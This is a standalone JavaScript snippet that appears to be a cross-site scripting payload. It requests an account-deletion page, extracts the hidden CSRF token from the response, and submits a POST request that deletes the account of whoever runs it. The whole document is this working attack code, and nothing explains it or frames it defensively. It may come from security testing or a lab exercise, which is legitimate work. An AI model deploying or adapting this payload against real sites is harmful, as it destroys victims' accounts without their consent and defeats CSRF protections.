var req = new XMLHttpRequest();
req.onload = deleteacc;
req.open('get','/app/delete/mhmdth.rdyy@example.com', true);
req.send();

function deleteacc(){
	var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
	var changeReq = new XMLHttpRequest();
	changeReq.open('post','/app/delete', true);
	changeReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
	changeReq.send('csrf=' + token);
};
